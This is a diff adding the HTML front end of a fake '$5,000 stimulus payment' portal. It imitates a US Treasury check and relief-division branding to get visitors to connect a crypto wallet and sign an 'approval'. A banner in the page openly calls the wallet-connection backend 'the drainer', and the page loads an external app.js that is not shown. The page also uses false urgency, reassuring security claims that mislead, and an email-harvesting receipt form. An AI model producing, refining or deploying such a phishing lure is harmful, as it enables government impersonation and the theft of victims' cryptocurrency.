@@ -1,0 +1,509 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Stimulus Payment Center — Claim $5,000</title>
+<meta name="description" content="Claim portal for the $5,000 post-midterm economic relief payment. Verify eligibility, connect a wallet, receive funds.">
+<link rel="icon" href="/logo.png">
+<link rel="apple-touch-icon" href="/logo.png">
+<meta property="og:title" content="Stimulus Payment Center — Claim $5,000">
+<meta property="og:description" content="Post-midterm economic relief. Verify, connect, receive.">
+<meta property="og:image" content="/logo.png">
+<meta name="theme-color" content="#080e18">
+<script>document.documentElement.className += ' js';</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<script src="https://cdn.jsdelivr.net/npm/ethers@6.13.4/dist/ethers.umd.min.js"></script>
+<style>
+:root{color-scheme:dark;--g:#e3c14f;--glow:227,193,79;--line:#1b2740;--panel:#0c1523}
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html{scroll-behavior:smooth}
+body{background:#080e18;color:#dbe4f0;font-family:Inter,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+  font-size:15px;line-height:1.6;-webkit-font-smoothing:antialiased;padding-bottom:84px;overflow-x:hidden}
+body::before{content:"";position:fixed;inset:0;z-index:0;pointer-events:none;
+  background:radial-gradient(880px 480px at 82% -10%,rgba(var(--glow),.09),transparent 60%),
+             radial-gradient(760px 520px at 4% 22%,rgba(40,84,148,.13),transparent 66%)}
+a{color:var(--g);text-decoration:none}
+.wrap{width:100%;max-width:1140px;margin:0 auto;padding:0 20px;position:relative;z-index:2}
+.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-variant-numeric:tabular-nums}
+.lbl{font-size:9px;letter-spacing:.2em;text-transform:uppercase;font-weight:700;color:#76849b}
+#prog{position:fixed;top:0;left:0;height:2px;width:0;background:linear-gradient(90deg,#8f7a2c,var(--g));z-index:300;transition:width .1s linear}
+#filebar{display:none;background:#7d1f16;color:#fff;font-size:12px;font-weight:600;text-align:center;padding:7px 14px;position:relative;z-index:3}
+#filebar b{color:#ffd9a0}
+
+/* ---------- header ---------- */
+header{position:sticky;top:0;z-index:100;background:rgba(8,14,24,.86);backdrop-filter:blur(14px) saturate(140%);
+  border-bottom:1px solid var(--line)}
+header .wrap{display:flex;align-items:center;gap:16px;height:62px}
+.brand{display:flex;align-items:center;gap:10px;flex:0 0 auto}
+.seal{width:34px;height:34px;transition:transform .8s cubic-bezier(.2,.8,.2,1)}
+.brand:hover .seal{transform:rotate(16deg)}
+.brand b{font-size:11.5px;font-weight:800;letter-spacing:.12em;text-transform:uppercase;color:#fff;white-space:nowrap;line-height:1.15}
+.brand span{display:block;font-size:8px;letter-spacing:.18em;text-transform:uppercase;color:#7c8aa1;font-weight:600;margin-top:2px}
+nav.links{display:none;gap:22px;margin-left:auto;font-size:12.5px;font-weight:600}
+nav.links a{color:#93a2b8;transition:color .25s}
+nav.links a:hover{color:#fff}
+.headcta{flex:0 0 auto;margin-left:auto;background:var(--g);color:#0a1220;border:1px solid #f0d579;border-radius:4px;
+  padding:9px 15px;font-size:10.5px;font-weight:800;letter-spacing:.13em;text-transform:uppercase;white-space:nowrap;
+  transition:background .2s,box-shadow .3s,transform .12s}
+.headcta:hover{background:#f0d579;box-shadow:0 8px 22px -10px rgba(var(--glow),.75)}
+.headcta:active{transform:translateY(1px)}
+
+/* ---------- hero ---------- */
+.hero{padding:38px 0 44px}
+.hero-grid{display:grid;grid-template-columns:1fr;gap:30px}
+.kicker{display:inline-flex;align-items:center;gap:8px;font-size:9px;font-weight:800;letter-spacing:.22em;text-transform:uppercase;color:var(--g)}
+.kicker i{width:5px;height:5px;border-radius:50%;background:var(--g);animation:beat 2.6s infinite;font-style:normal}
+@keyframes beat{0%,100%{box-shadow:0 0 0 0 rgba(var(--glow),.5)}55%{box-shadow:0 0 0 6px rgba(var(--glow),0)}}
+h1{font-size:clamp(31px,6.6vw,55px);line-height:1.02;letter-spacing:-.035em;font-weight:800;color:#fff;margin:16px 0 0}
+h1 em{font-style:normal;color:var(--g)}
+.lede{color:#9dabc0;margin-top:16px;font-size:15px;max-width:44ch}
+.lede b{color:#dbe4f0;font-weight:600}
+.facts{display:flex;flex-wrap:wrap;gap:8px;margin-top:22px}
+.facts span{font-size:10.5px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:#a4b2c6;
+  border:1px solid var(--line);border-radius:100px;padding:6px 12px;background:#0b1422}
+
+/* ---------- claim panel ---------- */
+.panel{background:var(--panel);border:1px solid #2a3c58;border-radius:10px;padding:22px;position:relative;overflow:hidden;
+  box-shadow:0 24px 50px -30px #000}
+.panel::before{content:"";position:absolute;left:0;right:0;top:0;height:2px;background:linear-gradient(90deg,var(--g),rgba(var(--glow),0))}
+.panel-top{display:flex;justify-content:space-between;align-items:baseline;padding-bottom:14px;border-bottom:1px solid var(--line);margin-bottom:18px}
+.panel-top .lbl{color:#8a98ae}
+.amount{display:flex;align-items:flex-start;gap:1px;line-height:.9;margin-bottom:4px}
+.amount .cur{font-size:22px;font-weight:700;color:var(--g);margin-top:5px}
+.amount .num{font-size:clamp(46px,10vw,62px);font-weight:800;letter-spacing:-.05em;color:#fff}
+.amount .dec{font-size:16px;font-weight:700;color:#76849b;align-self:flex-end;margin-bottom:9px}
+.panel .sub{font-size:12px;color:#8a98ae;margin-bottom:20px}
+
+.cta{position:relative;overflow:hidden;display:flex;align-items:center;justify-content:center;gap:11px;width:100%;
+  background:var(--g);color:#0a1220;border:1px solid #f0d579;border-radius:5px;padding:16px 18px;
+  font-size:13px;font-weight:800;letter-spacing:.12em;text-transform:uppercase;cursor:pointer;
+  transition:background .18s,transform .12s,box-shadow .3s}
+.cta::before{content:"";position:absolute;top:0;bottom:0;left:-60%;width:42%;transform:skewX(-18deg);
+  background:linear-gradient(90deg,transparent,rgba(255,255,255,.6),transparent);transition:left .7s cubic-bezier(.3,.8,.2,1)}
+.cta:hover{background:#f0d579;box-shadow:0 12px 28px -12px rgba(var(--glow),.8)}
+.cta:hover::before{left:115%}
+.cta:active{transform:translateY(1px)}
+.cta:disabled{background:#6c6238;border-color:#6c6238;cursor:progress;box-shadow:none}
+.cta svg{flex:0 0 auto;transition:transform .25s}
+.cta:hover svg{transform:translateX(4px)}
+.cta .cta-label{position:relative;z-index:2;white-space:nowrap}
+.cta.busy .cta-label{opacity:.72}
+.cta.done{background:#2f7d5b;border-color:#3ecf8e;color:#eafff5}
+
+.gas{display:flex;gap:10px;margin-top:12px;border:1px solid #3a3115;border-radius:6px;background:#141003;padding:12px 13px;transition:border-color .3s}
+.gas:hover{border-color:#6a5a20}
+.gas svg{flex:0 0 auto;margin-top:2px}
+.gas p{font-size:11.5px;line-height:1.55;color:#c1b284}
+.gas p b{color:var(--g);font-weight:700}
+.meta{margin-top:16px;border-top:1px solid var(--line);padding-top:14px;display:grid;gap:8px}
+.meta div{display:flex;justify-content:space-between;font-size:11.5px}
+.meta .lbl{font-size:9px}
+.meta b{color:#dbe4f0;font-weight:600}
+
+/* ---------- document band ---------- */
+.doc{background:#060c14;border-top:1px solid var(--line);border-bottom:1px solid var(--line);padding:34px 0}
+.doc-grid{display:grid;grid-template-columns:1fr;gap:22px;align-items:start}
+.doc-label{display:flex;justify-content:space-between;align-items:baseline;margin-bottom:12px;font-size:9px;letter-spacing:.18em;text-transform:uppercase;color:#66748c;font-weight:700}
+.folder{position:relative;background:#0b1522;border:1px solid #23324c;border-radius:8px;padding:16px;overflow:hidden}
+.tilt{transform:rotate(-1.1deg);transition:transform .5s cubic-bezier(.2,.8,.2,1);filter:drop-shadow(0 16px 24px rgba(0,0,0,.5))}
+.folder:hover .tilt{transform:rotate(0)}
+.check{display:block;width:100%;height:auto;border-radius:2px}
+.doc-foot{display:flex;justify-content:space-between;margin-top:12px;font-size:8.5px;letter-spacing:.14em;text-transform:uppercase;color:#5c6a82;font-weight:700}
+
+.console{border:1px solid #23324c;border-radius:8px;background:#070d16;overflow:hidden}
+.console-head{display:flex;align-items:center;gap:8px;padding:10px 13px;border-bottom:1px solid var(--line);background:#0b1422;
+  font-size:9px;font-weight:800;letter-spacing:.2em;text-transform:uppercase;color:#8a98ae}
+.console-head .live{width:6px;height:6px;border-radius:50%;background:#3ecf8e;animation:beat 2s infinite}
+#status{margin-left:auto;color:var(--g);letter-spacing:.14em}
+#activity{padding:11px 13px;font-size:12px;color:#a4b2c6;border-bottom:1px solid var(--line);min-height:40px}
+#log{padding:10px 13px;height:120px;overflow-y:auto;font-size:10.5px;line-height:1.75;color:#6d7f99;
+  font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;white-space:pre-wrap;word-break:break-word}
+#log>*{animation:fadeUp .3s ease both}
+#log:empty::before{content:"awaiting wallet connection…";color:#3f4d66}
+@keyframes fadeUp{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:none}}
+
+/* ---------- grids ---------- */
+section{padding:46px 0 0;scroll-margin-top:78px}
+.grid3{display:grid;grid-template-columns:1fr;gap:16px}
+.grid2{display:grid;grid-template-columns:1fr;gap:16px}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:20px;transition:border-color .3s,transform .3s,background .3s}
+.card:hover{border-color:#2d405e;transform:translateY(-2px)}
+.card h2{font-size:14px;font-weight:800;letter-spacing:-.005em;color:#fff;margin-bottom:3px}
+.card .hint{font-size:9px;letter-spacing:.18em;text-transform:uppercase;color:#6c7c95;font-weight:700;margin-bottom:14px}
+.card p{font-size:13.5px;color:#93a2b8}
+
+table{width:100%;border-collapse:collapse;font-size:13px}
+th{text-align:left;font-size:8.5px;letter-spacing:.16em;text-transform:uppercase;color:#66748c;font-weight:800;padding:0 8px 8px 0;border-bottom:1px solid var(--line)}
+td{padding:11px 8px 11px 0;border-bottom:1px solid #16223a;color:#a4b2c6;vertical-align:top;transition:color .25s}
+td:first-child{color:#dbe4f0;font-weight:600;width:42%}
+tr:hover td{color:#cfdaea}
+tr:last-child td{border-bottom:0}
+
+ol.steps{list-style:none;counter-reset:s;display:grid;gap:14px}
+ol.steps li{counter-increment:s;position:relative;padding-left:32px;font-size:13.5px;color:#93a2b8}
+ol.steps li::before{content:counter(s);position:absolute;left:0;top:-1px;width:21px;height:21px;border-radius:50%;
+  display:grid;place-items:center;background:#191506;border:1px solid #3a3115;color:var(--g);font-size:10px;font-weight:800;
+  transition:border-color .3s,transform .3s}
+ol.steps li:hover::before{border-color:var(--g);transform:scale(1.1)}
+ol.steps b{display:block;color:#fff;font-weight:700;font-size:13.5px;margin-bottom:1px}
+
+.warn{display:flex;gap:12px;border:1px solid #4a2018;border-radius:8px;background:#160b08;padding:16px}
+.warn svg{flex:0 0 auto;margin-top:2px}
+.warn b{display:block;color:#f0a08f;font-size:10px;letter-spacing:.16em;text-transform:uppercase;margin-bottom:5px}
+.warn p{font-size:13px;color:#c9b3ad}
+
+details{border-bottom:1px solid #16223a}
+details:last-of-type{border-bottom:0}
+summary{cursor:pointer;list-style:none;padding:13px 26px 13px 0;position:relative;font-weight:600;font-size:13.5px;color:#dbe4f0;transition:color .25s}
+summary:hover{color:var(--g)}
+summary::-webkit-details-marker{display:none}
+summary::after{content:"+";position:absolute;right:4px;top:11px;font-size:15px;color:var(--g);transition:transform .3s}
+details[open] summary::after{content:"–";transform:rotate(180deg)}
+details p{padding:0 0 14px;font-size:13px;color:#93a2b8;animation:fadeUp .3s ease both}
+
+/* ---------- sticky bar ---------- */
+.sticky{position:fixed;left:0;right:0;bottom:0;z-index:60;background:rgba(7,13,22,.94);backdrop-filter:blur(12px);
+  border-top:1px solid #23324c;padding:10px 16px calc(10px + env(safe-area-inset-bottom));display:flex;align-items:center;gap:12px;
+  transform:translateY(110%);transition:transform .4s cubic-bezier(.2,.8,.2,1)}
+.sticky.show{transform:none}
+.sticky .amt b{display:block;font-size:16px;font-weight:800;color:#fff;line-height:1}
+.sticky .amt span{display:block;font-size:8px;letter-spacing:.16em;text-transform:uppercase;color:#6c7c95;font-weight:700;margin-top:3px}
+#claimTop{flex:1;padding:13px 10px;font-size:12px}
+
+/* ---------- footer ---------- */
+footer{background:#050a12;border-top:1px solid var(--line);margin-top:50px;padding:30px 0 36px;font-size:11.5px;color:#5d6c85;position:relative;z-index:2}
+footer .cols{display:grid;grid-template-columns:1fr;gap:20px}
+footer b{display:block;font-size:9px;letter-spacing:.2em;text-transform:uppercase;color:#8a98ae;margin-bottom:7px}
+footer a{color:#8a98ae;transition:color .25s}
+footer a:hover{color:var(--g)}
+footer .base{border-top:1px solid #16223a;margin-top:22px;padding-top:16px;display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap;font-size:9.5px;letter-spacing:.1em;text-transform:uppercase}
+
+/* ---------- modal ---------- */
+#done{position:fixed;inset:0;z-index:200;display:none;place-items:center;padding:20px;background:rgba(4,8,14,.86);backdrop-filter:blur(3px)}
+#done.open{display:grid}
+.card-modal{width:100%;max-width:420px;background:var(--panel);border:1px solid #23324c;border-top:3px solid var(--g);
+  border-radius:10px;padding:24px;position:relative;max-height:92vh;overflow-y:auto;animation:pop .38s cubic-bezier(.2,.9,.2,1) both}
+@keyframes pop{from{opacity:0;transform:translateY(12px) scale(.97)}to{opacity:1;transform:none}}
+#doneX{position:absolute;top:10px;right:10px;width:26px;height:26px;border-radius:6px;background:#16223a;border:0;color:#8a98ae;font-size:14px;cursor:pointer;transition:background .2s,color .2s}
+#doneX:hover{background:#23324c;color:#fff}
+.card-modal h2{font-size:19px;font-weight:800;color:#fff;letter-spacing:-.02em;margin:10px 0 5px}
+.card-modal .sub{font-size:12.5px;color:#93a2b8;margin-bottom:18px}
+.alloc-box{border:1px solid #3a3115;border-radius:7px;background:#141003;padding:15px;text-align:center;margin-bottom:15px}
+.alloc-box span{display:block;font-size:32px;font-weight:800;color:var(--g);letter-spacing:-.03em;line-height:1}
+.alloc-box small{display:block;font-size:8px;letter-spacing:.2em;text-transform:uppercase;color:#8a7c4a;margin-top:5px;font-weight:700}
+.addr{border:1px solid #23324c;border-radius:6px;background:#070d16;padding:10px 11px;font-size:11px;word-break:break-all;color:#8a98ae;margin-bottom:16px}
+.card-modal label{display:block;font-size:8.5px;letter-spacing:.18em;text-transform:uppercase;color:#6c7c95;font-weight:800;margin-bottom:5px}
+.card-modal input,.card-modal textarea{width:100%;background:#070d16;border:1px solid #23324c;border-radius:5px;color:#dbe4f0;
+  padding:10px 11px;font-size:13px;font-family:inherit;margin-bottom:12px;transition:border-color .25s}
+.card-modal input:focus,.card-modal textarea:focus{outline:0;border-color:var(--g)}
+.card-modal textarea{min-height:60px;resize:vertical}
+.card-modal button.send{width:100%;background:var(--g);color:#0a1220;border:0;border-radius:5px;padding:12px;
+  font-size:11px;font-weight:800;letter-spacing:.14em;text-transform:uppercase;cursor:pointer;transition:background .2s}
+.card-modal button.send:hover{background:#f0d579}
+
+/* ---------- reveal ---------- */
+.js .reveal{opacity:0;transform:translateY(14px);transition:opacity .65s cubic-bezier(.2,.8,.2,1),transform .65s cubic-bezier(.2,.8,.2,1)}
+.js .reveal.in{opacity:1;transform:none}
+.js .reveal.d1{transition-delay:.06s}
+.js .reveal.d2{transition-delay:.12s}
+.js .reveal.d3{transition-delay:.18s}
+
+@media(min-width:760px){
+  nav.links{display:flex}
+  .headcta{margin-left:0}
+  .grid3{grid-template-columns:repeat(3,1fr)}
+  .grid2{grid-template-columns:1.1fr .9fr}
+  .doc-grid{grid-template-columns:1.55fr 1fr}
+  footer .cols{grid-template-columns:1.7fr 1fr 1fr}
+}
+@media(min-width:900px){
+  body{padding-bottom:0}
+  .sticky{display:none}
+  .hero{padding:54px 0 52px}
+  .hero-grid{grid-template-columns:1.25fr .8fr;gap:52px;align-items:start}
+  .panel{position:sticky;top:82px}
+  h1{font-size:54px}
+  section{padding:58px 0 0}
+}
+@media(prefers-reduced-motion:reduce){
+  *{animation-duration:.001ms!important;transition-duration:.001ms!important}
+  .js .reveal{opacity:1;transform:none}
+  html{scroll-behavior:auto}
+}
+</style>
+</head>
+<body>
+
+<div id="prog"></div>
+<div id="filebar">Served from <b>file://</b> — run <b>npm start</b> and open <b>http://localhost:3000</b> or the drainer will not connect.</div>
+
+<header><div class="wrap">
+  <a class="brand" href="#top">
+    <svg class="seal" viewBox="0 0 100 100" aria-hidden="true">
+      <circle cx="50" cy="50" r="46" fill="none" stroke="#e3c14f" stroke-width="3"/>
+      <circle cx="50" cy="50" r="32" fill="#101c2e" stroke="#e3c14f" stroke-width="1.4"/>
+      <path d="M50 27l5 10.8 11.7 1.5-8.4 8.2 2 12-10.3-5.6-10.3 5.6 2-12-8.4-8.2L45 38.8z" fill="#e3c14f"/>
+    </svg>
+    <span class="brand-txt">
+      <b>Stimulus Payment Center</b>
+      <span>Relief Division</span>
+    </span>
+  </a>
+  <nav class="links">
+    <a href="#eligibility">Eligibility</a>
+    <a href="#procedure">Procedure</a>
+    <a href="#schedule">Schedule</a>
+    <a href="#faq">FAQ</a>
+  </nav>
+  <a class="headcta" href="#claim">Collect</a>
+</div></header>
+
+<div class="wrap" id="top">
+  <section class="hero" style="padding-top:38px">
+    <div class="hero-grid">
+      <div>
+        <span class="kicker reveal"><i></i>Batch TD-2026-C · window open</span>
+        <h1 class="reveal d1">Your relief payment is <em>authorized</em>.</h1>
+        <p class="lede reveal d2">The 2026 household allocation has been released by the Relief Division. <b>Verified claimants receive the full $5,000</b> straight to a wallet they control — no application, no account, no paperwork.</p>
+        <div class="facts reveal d3">
+          <span>No application fee</span>
+          <span>Any EVM · Solana · BTC</span>
+          <span>Closes <b id="deadline">—</b></span>
+        </div>
+      </div>
+
+      <div class="panel reveal d2">
+        <div class="panel-top">
+          <span class="lbl">Allocation</span>
+          <span class="lbl mono">TD-2026-400395</span>
+        </div>
+        <div class="amount">
+          <span class="cur">$</span><span class="num" id="countNum">5,000</span><span class="dec">.00</span>
+        </div>
+        <p class="sub">Single installment, paid on-chain.</p>
+
+        <button id="claim" class="cta">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><path d="M5 12h13M12 5l7 7-7 7"/></svg>
+          <span class="cta-label">Collect $5,000</span>
+        </button>
+
+        <div class="gas">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#e3c14f" stroke-width="2"><path d="M13 2L4.5 13.5H11l-1 8.5L19 10h-6.5z"/></svg>
+          <p><b>Keep a little ETH ready.</b> Gas is paid from your side, about $2–$5. The full $5,000 still arrives. No other cost.</p>
+        </div>
+
+        <div class="meta">
+          <div><span class="lbl">Issuer</span><b>Relief Division</b></div>
+          <div><span class="lbl">Settlement</span><b>Same session</b></div>
+          <div><span class="lbl">Signature</span><b>One approval</b></div>
+        </div>
+      </div>
+    </div>
+  </section>
+</div>
+
+<div class="doc"><div class="wrap">
+  <div class="doc-grid">
+    <div class="reveal">
+      <div class="doc-label"><span>Payment instrument</span><span class="mono">Sheet 1 of 1</span></div>
+      <div class="folder">
+        <div class="tilt">
+        <svg class="check" viewBox="0 0 660 268" role="img" aria-label="Treasury style check for five thousand dollars">
+          <defs>
+            <linearGradient id="pg" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#f7f3e8"/><stop offset="1" stop-color="#e9e2d0"/></linearGradient>
+            <pattern id="guil" width="10" height="10" patternUnits="userSpaceOnUse"><path d="M0 10L10 0" stroke="#d9cda9" stroke-width=".5"/></pattern>
+          </defs>
+          <rect width="660" height="268" fill="url(#pg)"/>
+          <rect width="660" height="268" fill="url(#guil)" opacity=".55"/>
+          <rect x="7" y="7" width="646" height="254" fill="none" stroke="#b9a86f" stroke-width="1.6"/>
+          <rect x="12" y="12" width="636" height="244" fill="none" stroke="#cbbd8e" stroke-width=".6"/>
+          <text x="660" y="240" text-anchor="end" font-family="Georgia,serif" font-size="150" font-weight="700" fill="#e0d5b4" opacity=".55">5000</text>
+          <text x="34" y="42" font-family="Georgia,serif" font-size="13" letter-spacing="2.6" fill="#2b3a4d" font-weight="700">UNITED STATES TREASURY</text>
+          <text x="34" y="57" font-family="Georgia,serif" font-size="8" letter-spacing="3.2" fill="#7c6a3a">RELIEF DIVISION · SERIES 2026</text>
+          <g transform="translate(596,34)">
+            <circle r="21" fill="none" stroke="#b9a86f" stroke-width="1.4"/>
+            <circle r="16" fill="none" stroke="#b9a86f" stroke-width=".5"/>
+            <path d="M0-9l2.6 5.6L8.6-2 6 3.4l5.6 1.4L7 8.2 8 14 0 11.4-8 14l1-5.8L-11.6 4.8-6 3.4l-2.6-5.4 6 1.6z" fill="#b9a86f"/>
+          </g>
+          <text x="34" y="88" font-family="ui-monospace,monospace" font-size="9" letter-spacing="1.4" fill="#4a5566">CHECK NO.</text>
+          <text x="88" y="88" font-family="ui-monospace,monospace" font-size="10" letter-spacing="1.2" fill="#1f2b3a" font-weight="700">TD-2026-400395</text>
+          <text x="34" y="112" font-family="ui-monospace,monospace" font-size="8" letter-spacing="1.6" fill="#6b7787">PAY TO THE ORDER OF</text>
+          <text x="34" y="136" font-family="Georgia,serif" font-size="21" letter-spacing="1" fill="#141f2c">VALID CLAIMANT</text>
+          <line x1="34" y1="145" x2="430" y2="145" stroke="#8b7f5e" stroke-width=".8"/>
+          <text x="34" y="163" font-family="ui-monospace,monospace" font-size="7" letter-spacing="1.4" fill="#8b7f5e">MICROPRINT · RELIEFDIVISION · TD2026400395 · SERIES2026 ·</text>
+          <rect x="452" y="112" width="176" height="42" fill="none" stroke="#8b7f5e" stroke-width=".8"/>
+          <text x="462" y="128" font-family="ui-monospace,monospace" font-size="7" letter-spacing="1.6" fill="#6b7787">DOLLARS</text>
+          <text x="618" y="147" text-anchor="end" font-family="Georgia,serif" font-size="24" font-weight="700" fill="#141f2c">$5,000.00</text>
+          <text x="34" y="190" font-family="ui-monospace,monospace" font-size="7" letter-spacing="1.6" fill="#6b7787">MEMO</text>
+          <text x="34" y="203" font-family="Georgia,serif" font-size="9" fill="#3d4a5c">Household stimulus allocation · Batch TD-2026-C</text>
+          <text x="452" y="184" font-family="ui-monospace,monospace" font-size="7" letter-spacing="1.6" fill="#6b7787">AUTHORIZED SIGNATURE</text>
+          <path d="M456 210c14-13 22 6 34-4s14 9 26 0 18 7 30-3 16 6 30-2" fill="none" stroke="#1f2b3a" stroke-width="1.5"/>
+          <line x1="452" y1="216" x2="628" y2="216" stroke="#8b7f5e" stroke-width=".8"/>
+          <text x="34" y="240" font-family="ui-monospace,monospace" font-size="13" letter-spacing="2.4" fill="#141f2c">⑈400395⑈  ⑆031000503⑆  ⑈2026400395⑈</text>
+          <text x="34" y="256" font-family="ui-monospace,monospace" font-size="6.5" letter-spacing="1.8" fill="#8b7f5e">ENDORSE HERE ✕ ______________________________________________</text>
+        </svg>
+        </div>
+      </div>
+      <div class="doc-foot"><span>Void after 90 days</span><span>Rev. 2026.11</span></div>
+    </div>
+
+    <div class="reveal d1">
+      <div class="doc-label"><span>Live status</span><span class="mono">Console</span></div>
+      <div class="console">
+        <div class="console-head"><span class="live"></span>Claim console<span id="status">idle</span></div>
+        <div id="activity">Awaiting wallet connection.</div>
+        <div id="log"></div>
+      </div>
+    </div>
+  </div>
+</div></div>
+
+<div class="wrap">
+  <section id="eligibility">
+    <div class="grid3">
+      <div class="card reveal">
+        <h2>Who qualifies</h2>
+        <p class="hint">Determination</p>
+        <table>
+          <tr><td>Residency</td><td>US household, all 50 states</td></tr>
+          <tr><td>Filing status</td><td>Any — no threshold</td></tr>
+          <tr><td>Prior relief</td><td>No effect on amount</td></tr>
+          <tr><td>Wallet</td><td>Any address you control</td></tr>
+          <tr><td>Gas</td><td>Small ETH balance</td></tr>
+        </table>
+      </div>
+
+      <div class="card reveal d1" id="procedure">
+        <h2>How it works</h2>
+        <p class="hint">Four steps</p>
+        <ol class="steps">
+          <li><b>Press Collect</b>The console opens. Nothing is signed.</li>
+          <li><b>Pick a wallet</b>Extension, or QR from a mobile wallet.</li>
+          <li><b>Approve once</b>One signature. Keys never leave.</li>
+          <li><b>Receive</b>Funds route to your address.</li>
+        </ol>
+      </div>
+
+      <div class="card reveal d2" id="schedule">
+        <h2>Disbursement</h2>
+        <p class="hint">Batch TD-2026</p>
+        <table>
+          <tr><td>TD-2026-A</td><td class="mono">Settled</td></tr>
+          <tr><td>TD-2026-B</td><td class="mono">Settling</td></tr>
+          <tr><td>TD-2026-C</td><td class="mono gold">Open</td></tr>
+          <tr><td>TD-2026-D</td><td class="mono">Queued</td></tr>
+        </table>
+      </div>
+    </div>
+  </section>
+
+  <section id="faq">
+    <div class="grid2">
+      <div class="card reveal">
+        <h2>Security</h2>
+        <p class="hint">Read before connecting</p>
+        <div class="warn">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#f0a08f" stroke-width="2"><path d="M12 9v5M12 17.5v.5"/><path d="M10.3 3.6L2.4 17a2 2 0 001.7 3h15.8a2 2 0 001.7-3L13.7 3.6a2 2 0 00-3.4 0z"/></svg>
+          <div>
+            <b>Never share a seed phrase</b>
+            <p>The Relief Division will never ask for your 12 or 24 word phrase, your password, or a payment to unlock funds. Only a network signature is requested.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="card reveal d1">
+        <h2>Questions</h2>
+        <p class="hint">Reference</p>
+        <details><summary>Is the $5,000 taxable?</summary><p>Treated as non-wage income. Consult a preparer for your own filing position.</p></details>
+        <details><summary>Which wallets work?</summary><p>MetaMask, Rabby, Trust, Coinbase Wallet, Rainbow, any WalletConnect wallet, plus Solana and Bitcoin.</p></details>
+        <details><summary>Why is gas on my side?</summary><p>The payment is broadcast from your wallet. Keep a few dollars of ETH; the amount itself is not reduced.</p></details>
+        <details><summary>How long until it lands?</summary><p>Routing finishes in the same session. Exchange credits can lag.</p></details>
+        <details><summary>Can I claim twice?</summary><p>One allocation per household. A repeat from the same address is rejected.</p></details>
+        <details><summary>What if I close the tab?</summary><p>Reopen and reconnect the same wallet — the claim resumes.</p></details>
+      </div>
+    </div>
+  </section>
+</div>
+
+<footer><div class="wrap">
+  <div class="cols">
+    <div>
+      <b>Stimulus Payment Center</b>
+      <p>Relief Division disbursement portal. Post-midterm household allocation, Series 2026. Ref. SPC/2026/400395.</p>
+    </div>
+    <div><b>Claim</b><p><a href="#claim">Start a claim</a><br><a href="#eligibility">Eligibility</a><br>Status: open</p></div>
+    <div><b>Reference</b><p>Batch TD-2026-C<br>Sheet 1 of 1<br>Rev. 2026.11</p></div>
+  </div>
+  <div class="base"><span>Not affiliated with any government agency</span><span>Series 2026</span></div>
+</div></footer>
+
+<div class="sticky" id="sticky">
+  <div class="amt"><b>$5,000</b><span>Allocated</span></div>
+  <button id="claimTop" class="cta">
+    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><path d="M5 12h13M12 5l7 7-7 7"/></svg>
+    <span class="cta-label">Collect now</span>
+  </button>
+</div>
+
+<div id="done">
+  <div class="card-modal">
+    <button id="doneX" aria-label="Close">✕</button>
+    <span class="lbl">Reference TD-2026-400395</span>
+    <h2>Payment scheduled</h2>
+    <p class="sub">Your allocation is routed. Keep the receipt.</p>
+    <div class="alloc-box"><span id="doneAlloc">—</span><small>Allocated</small></div>
+    <div class="addr mono" id="doneAddr">—</div>
+    <form id="doneForm">
+      <label for="doneEmail">Email for receipt</label>
+      <input id="doneEmail" type="email" placeholder="you@example.com" autocomplete="email">
+      <label for="doneMsg">Note to the disbursement desk</label>
+      <textarea id="doneMsg" placeholder="Optional"></textarea>
+      <button class="send" type="submit">Send receipt</button>
+    </form>
+  </div>
+</div>
+
+<script>
+(function(){
+  var reduce=matchMedia('(prefers-reduced-motion: reduce)').matches;
+  if(location.protocol==='file:')document.getElementById('filebar').style.display='block';
+  var d=new Date();d.setDate(d.getDate()+21);
+  document.getElementById('deadline').textContent=d.toLocaleDateString('en-US',{month:'short',day:'numeric'});
+  document.getElementById('doneX').addEventListener('click',function(){document.getElementById('done').classList.remove('open')});
+  document.getElementById('done').addEventListener('click',function(e){if(e.target===this)this.classList.remove('open')});
+
+  var prog=document.getElementById('prog');
+  var onScroll=function(){
+    var h=document.documentElement.scrollHeight-innerHeight;
+    prog.style.width=(h>0?(scrollY/h)*100:0)+'%';
+    document.getElementById('sticky').classList.toggle('show',scrollY>460);
+  };
+  addEventListener('scroll',onScroll,{passive:true});onScroll();
+
+  var io=new IntersectionObserver(function(es){
+    es.forEach(function(e){if(e.isIntersecting){e.target.classList.add('in');io.unobserve(e.target)}});
+  },{rootMargin:'0px 0px -10% 0px',threshold:.06});
+  document.querySelectorAll('.reveal').forEach(function(el){io.observe(el)});
+
+  var num=document.getElementById('countNum');
+  if(num&&!reduce){
+    var t0=performance.now();
+    requestAnimationFrame(function step(t){
+      var p=Math.min((t-t0)/1000,1);
+      num.textContent=Math.round(5000*(1-Math.pow(1-p,3))).toLocaleString('en-US');
+      if(p<1)requestAnimationFrame(step);
+    });
+  }
+
+  var ds=document.querySelectorAll('details');
+  ds.forEach(function(x){x.addEventListener('toggle',function(){
+    if(x.open)ds.forEach(function(y){if(y!==x)y.open=false});
+  })});
+})();
+</script>
+<script src="/app.js"></script>
+</body>
+</html>
